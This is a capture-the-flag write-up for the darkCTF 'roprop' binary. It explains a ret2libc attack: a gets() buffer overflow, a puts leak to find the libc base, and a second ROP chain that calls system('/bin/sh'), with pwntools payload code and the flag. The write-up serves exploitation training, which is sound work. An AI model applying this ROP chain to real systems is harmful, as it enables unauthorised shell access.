# roprop
Basic ret2libc problem, there is no useful function in the binary, if PIE is disabled, we can use ret2libc to run system in libc.

Check the security first:
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
PIE is disabled, we can find the plt.got table address correctly.

In main function, there is a gets function call, which can be used to do buffer overflow.

Check the plt table:
```
...
Breakpoint 6 at 0x400660 (puts@plt)
...
``` 
We have puts function in plt table, so we can use puts to leak the base address of the libc, and use the base address to calculate system address.

Since base address will be different in every execution, we need to jump to the beginning of the main, to send payload again with same base address.
We need to do rop chain twice, first time leak the base address, second time call system function in libc.

We can use ldd command to find the libc version.

The first payload will be:
```
gadget2 = 0x00400963 # pop rdi; ret;
align_gadget = 0x00400646 # ret;
...
payload = b'A'*88 + p64(align_gadget) + p64(gadget2) + p64(got_puts) + p64(plt_puts) + p64(main)  
...
```
Align gadget is used to deal with the x86 64 stack alignment problem, with only ret; but do nothing. We call puts function to print puts got table address, and substract the offset of the puts function in libc, then we can obtain base address in this execution.

```
...
libc_puts = proc.recvline() # obtain puts got address
# leak base address
libc_puts = u64(libc_puts[:-1].ljust(8, b'\x00')) 
libc_base = libc_puts - libc.symbols['puts'] # obtain base address
libc_system = libc_base + libc.symbols['system'] # calculate system address
libc_binsh = libc_base + libc.search('/bin/sh').next() # find string '/bin/sh' in libc
...
```
Now, we have jump to the beginning of the main, and can send second payload.

The second payload will be:
```
...
payload = b'A'*88 + p64(gadget2) + p64(libc_binsh) + p64(libc_system) 
...
```
Execute the exploit.py, we obtain the flag:
```
darkCTF{y0u_r0p_r0p_4nd_w0n}
```

